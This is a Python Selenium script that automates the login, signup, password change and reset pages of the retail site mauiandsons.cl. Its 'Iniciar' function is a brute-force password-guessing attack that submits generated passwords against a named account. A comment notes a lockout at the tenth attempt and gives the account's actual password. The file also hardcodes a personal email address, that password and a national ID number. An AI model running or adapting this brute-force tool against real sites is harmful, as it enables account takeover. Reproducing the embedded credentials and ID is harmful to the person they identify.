from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time


def Iniciar():
    dic="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    bool = False
    contador=0
    PATH = "C:\Program Files (x86)\chromedriver.exe"
    driver = webdriver.Chrome(PATH)
    driver.get("https://www.mauiandsons.cl/")
    driver.find_element_by_class_name("authorization-link").click()
    time.sleep(3)
    for i in range(8,305):
        n=len(dic)**i
        pas=""
        for j in range(n):
            aux=j
            pas=""
            for e in range(1,i+1):
                pas+=dic[aux%len(dic)]
                aux=int(aux/len(dic))
            contador+=1
            print("Intento: "+str(contador)+" --> "+pas)
            if contador == 1:
                driver.find_element_by_id("email").send_keys("fpalmatrejo@gmail.com")
            if contador == 11:#esto me ayudo a confirmar el bloqueo al 10° intento, primero se probo con ==10
                driver.find_element_by_id("pass").clear()
                driver.find_element_by_id("pass").send_keys("A0aAAAAA")#esta era la contraseña
                driver.find_element_by_id("pass").send_keys(Keys.RETURN)
            else:
                driver.find_element_by_id("pass").clear()
                driver.find_element_by_id("pass").send_keys(pas)
                driver.find_element_by_id("pass").send_keys(Keys.RETURN)
            time.sleep(5)
            if driver.title == "Mi Cuenta":
                print("Se ha hackeado Maui con exito.")
                bool=True
                break
        if bool:
            break
    driver.quit()

def CrearCuenta():
    PATH = "C:\Program Files (x86)\chromedriver.exe"
    driver = webdriver.Chrome(PATH)
    driver.get("https://www.mauiandsons.cl/")
    driver.find_element_by_class_name("authorization-link").click()
    time.sleep(3)
    crear = driver.find_element_by_partial_link_text('Crear')
    crear.click()
    driver.find_element_by_id("firstname").send_keys(str(input("Nombre\n")))
    apellido1 = str(input("1° Apellido\n"))
    apellido2 = str(input("2° Apellido\n"))
    driver.find_element_by_id("lastname").send_keys(apellido1+" "+apellido2)
    driver.find_element_by_id("rut").send_keys(str(input("Rut\n")))
    driver.find_element_by_id("email_address").send_keys(str(input("Email\n")))
    pas = str(input("Contrasena\n"))
    driver.find_element_by_id("password").send_keys(pas)
    driver.find_element_by_id("password-confirmation").send_keys(pas)
    driver.find_element_by_xpath("//button[@title='Crear una cuenta'][@type='submit']").click()
    time.sleep(10)
    driver.quit()

def Restablecer():
    PATH = "C:\Program Files (x86)\chromedriver.exe"
    driver = webdriver.Chrome(PATH)
    driver.get("https://www.mauiandsons.cl/")
    driver.find_element_by_class_name("authorization-link").click()
    time.sleep(3)
    olvido = driver.find_element_by_partial_link_text('Olvidó')
    olvido.click()
    driver.find_element_by_id("email_address").send_keys("fpalmatrejo@gmail.com")
    driver.find_element_by_id("email_address").send_keys(Keys.RETURN)
    driver.quit()

def Cambiar():
    PATH = "C:\Program Files (x86)\chromedriver.exe"
    driver = webdriver.Chrome(PATH)
    driver.get("https://www.mauiandsons.cl/")
    driver.find_element_by_class_name("authorization-link").click()
    time.sleep(3)
    driver.find_element_by_id("email").send_keys("fpalmatrejo@gmail.com")
    driver.find_element_by_id("pass").send_keys("A0aAAAAA")
    driver.find_element_by_id("pass").send_keys(Keys.RETURN)
    time.sleep(2)
    driver.find_element_by_partial_link_text('de la cuenta').click()
    driver.find_element_by_id("rut").send_keys("19783062-k")
    driver.find_element_by_id("change-password").click()
    driver.find_element_by_id("current-password").send_keys("A0aAAAAA")
    driver.find_element_by_id("password").send_keys("AaaAAAAA")
    driver.find_element_by_id("password-confirmation").send_keys("AaaAAAAA")
    driver.find_element_by_id("password-confirmation").send_keys(Keys.RETURN)
    driver.quit()

print("Hola Mr. Robot")
while True:
    print("\n¿Que desea realizar?\n1)Crear cuenta.\n2)Iniciar sesión.\n3)Cambiar contraseña.\n4)Restablecer la contraseña.\n5)Salir.")
    opcion=int(input("Ingrese el numero junto a su opción: "))
    if opcion == 1:
        CrearCuenta()
    elif opcion == 2:
        Iniciar()
    elif opcion == 3:
        Cambiar()
    elif opcion == 4:
        Restablecer()
    elif opcion == 5:
        print("Hasta luego. ¡bipbupbip-ps!")
        break
    else:
        print("Opción no valida.")
